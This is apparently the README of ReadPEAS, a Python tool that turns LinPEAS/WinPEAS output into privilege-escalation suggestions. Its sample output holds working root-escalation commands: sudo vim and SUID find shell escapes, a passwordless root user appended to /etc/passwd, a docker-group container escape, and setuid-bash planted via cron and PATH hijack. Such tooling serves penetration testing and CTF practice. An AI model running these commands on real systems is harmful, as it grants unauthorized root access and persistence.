# ReadPEAS

```
  ____                _ ____  _____    _    ____
 |  _ \ ___  __ _  __| |  _ \| ____|  / \  / ___|
 | |_) / _ \/ _` |/ _` | |_) |  _|   / _ \ \___ \
 |  _ <  __/ (_| | (_| |  __/| |___ / ___ \ ___) |
 |_| \_\___|\__,_|\__,_|_|   |_____/_/   \_\____/
```

Parse LinPEAS/WinPEAS output and get ready-to-use privesc commands instantly.

---

## About

ReadPEAS takes raw LinPEAS or WinPEAS output and extracts actionable privilege escalation
findings — sorted by severity, with exploit commands included. No AI, no internet connection,
fully offline.

---

## Features

- Detects: sudo, SUID, capabilities, cron jobs, writable files, PATH hijack, dangerous groups
- Offline GTFOBins database with 452 binaries
- Severity sorting: CRITICAL -> HIGH -> MEDIUM -> INFO
- Colored terminal output or JSON export
- Filter by severity with `--only`
- Reads from file or stdin (pipe-friendly)

---

## Installation

```bash
git clone https://github.com/alisalive/readpeas
cd readpeas
python scripts/build_gtfobins.py
```

The build script clones GTFOBins, parses it, and writes `data/gtfobins.json`. Requires git.
No pip installs needed.

---

## Usage

```bash
# From file
python readpeas.py -f linpeas.txt

# Filter by severity
python readpeas.py -f linpeas.txt --only critical

# JSON output
python readpeas.py -f linpeas.txt -o json

# Pipe from stdin
cat linpeas.txt | python readpeas.py
```

---

## Example Output

```
  ____                _ ____  _____    _    ____
 |  _ \ ___  __ _  __| |  _ \| ____|  / \  / ___|
 ...
  LinPEAS/WinPEAS output reader  v0.1.0

[*] OS: linux
[*] Total findings: 6

[CRITICAL] sudo -> vim (/usr/bin/vim)
Commands:
  $ sudo vim -c ':!/bin/bash'
  $ sudo vim -c ':py import os; os.system("/bin/bash")'
------------------------------------------------------------
[CRITICAL] suid -> find (/usr/bin/find)
Commands:
  $ /usr/bin/find . -exec /bin/bash -p \; -quit
------------------------------------------------------------
[CRITICAL] writable_file -> /etc/passwd
Commands:
  $ echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
  $ su hacker
------------------------------------------------------------
[CRITICAL] group -> docker  Docker group allows container escape to root
Commands:
  $ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
------------------------------------------------------------
[HIGH] cron -> /opt/backup.sh (every: * * * * *, run_as: root)
Commands:
  $ echo 'chmod +s /bin/bash' >> /opt/backup.sh
------------------------------------------------------------
[HIGH] path_hijack -> /tmp  [Replace TARGET_BINARY with the binary name called by root process]
Commands:
  $ echo '#!/bin/bash' > /tmp/TARGET_BINARY
  $ echo 'chmod +s /bin/bash' >> /tmp/TARGET_BINARY
```

---

## Supported Checks

| Check           | Type            | Severity              |
|-----------------|-----------------|-----------------------|
| sudo -l         | `sudo`          | CRITICAL / INFO       |
| SUID binaries   | `suid`          | CRITICAL / INFO       |
| Capabilities    | `capabilities`  | CRITICAL / HIGH / INFO|
| Cron jobs       | `cron`          | HIGH / MEDIUM         |
| Writable files  | `writable_file` | CRITICAL              |
| PATH hijack     | `path_hijack`   | HIGH                  |
| Dangerous groups| `group`         | CRITICAL / HIGH / MEDIUM |

---

## Requirements

- Python 3.8+
- git (for `build_gtfobins.py` only)
- No pip installs required

---

## Author

alisalive | [alisalive.medium.com](https://alisalive.medium.com) | [github.com/alisalive](https://github.com/alisalive)
